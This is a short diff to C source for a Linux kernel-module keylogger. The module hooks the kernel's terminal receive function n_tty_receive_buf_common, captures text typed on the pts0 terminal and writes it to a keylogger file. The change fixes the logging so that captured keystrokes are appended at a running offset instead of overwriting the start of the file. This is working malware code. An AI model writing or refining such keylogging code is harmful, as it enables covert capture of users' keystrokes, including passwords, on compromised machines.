@@ -9,7 +9,7 @@
 unsigned long* o_n_tty_receive_buf_common;
 unsigned char* buff_original_code;
 struct file *keylogger_file;
-
+int log_index = 0;
 
 typedef int (*n_tty_receive_buf_common_t) (struct tty_struct *tty, const unsigned char *cp,
 			 char *fp, int count, int flow);
@@ -29,7 +29,8 @@ int my_n_tty_receive_buf_common(struct tty_struct *tty, const unsigned char *cp,
 
 	if (strcmp(cp, "") != 0 && strcmp(tty->name, "pts0") == 0) {
 		printk("%s", cp);	
-		driver_file_write(keylogger_file, 0, cp, result);
+		driver_file_write(keylogger_file, log_index, cp, result);
+		log_index = log_index + result;
 	}
 
 	// hooking the original function again
